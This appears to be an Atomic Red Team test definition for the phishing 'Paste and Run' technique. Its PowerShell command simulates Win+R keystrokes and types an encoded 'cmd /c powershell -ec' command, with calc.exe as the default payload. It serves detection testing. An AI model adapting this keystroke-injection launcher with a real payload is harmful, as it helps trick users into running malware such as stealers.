{
  "attack_technique": "T1566.002",
  "display_name": "Phishing: Spearphishing Link",
  "atomic_tests": [
    {
      "name": "Paste and run technique",
      "description": "Tests the **Paste and Run** technique, where users are tricked into running\nmalicious PowerShell commands by automating the Win+R command to open the\nRun dialog and input `encoded PowerShell to execute calc.exe.`\n\n- [Fake CAPTCHA Campaign](https://medium.com/@ahmed.moh.farou2/fake-captcha-campaign-on-arabic-pirated-movie-sites-delivers-lumma-stealer-4f203f7adabf)\n- [From Clipboard to Compromise](https://www.proofpoint.com/us/blog/threat-insight/clipboard-compromise-powershell-self-pwn)",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "command": "# Add user32.dll for keybd_event\nAdd-Type @\"\n    using System;\n    using System.Runtime.InteropServices;\n    public class K {\n        [DllImport(\"user32.dll\")]\n        public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);\n    }\n\"@\n\n# Virtual key codes\n$VK_LWIN, $VK_R, $KEYDOWN, $KEYUP = 0x5B, 0x52, 0x0000, 0x0002\n\n# Open Run dialog (Win+R)\n[K]::keybd_event($VK_LWIN, 0, $KEYDOWN, [UIntPtr]::Zero)\n[K]::keybd_event($VK_R, 0, $KEYDOWN, [UIntPtr]::Zero)\n[K]::keybd_event($VK_R, 0, $KEYUP, [UIntPtr]::Zero)\n[K]::keybd_event($VK_LWIN, 0, $KEYUP, [UIntPtr]::Zero)\n\n# Short delay for Run dialog\nStart-Sleep -Milliseconds 500\nAdd-Type -AssemblyName System.Windows.Forms\n[System.Windows.Forms.SendKeys]::SendWait(\"cmd /c powershell -ec \" + [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('#{execution_command}')) + \"{ENTER}\")"
      },
      "input_arguments": {
        "execution_command": {
          "description": "The command to execute in the run",
          "type": "String",
          "default": "calc.exe"
        }
      },
      "auto_generated_guid": "bc177ef9-6a12-4ebc-a2ec-d41e19c2791d"
    }
  ]
}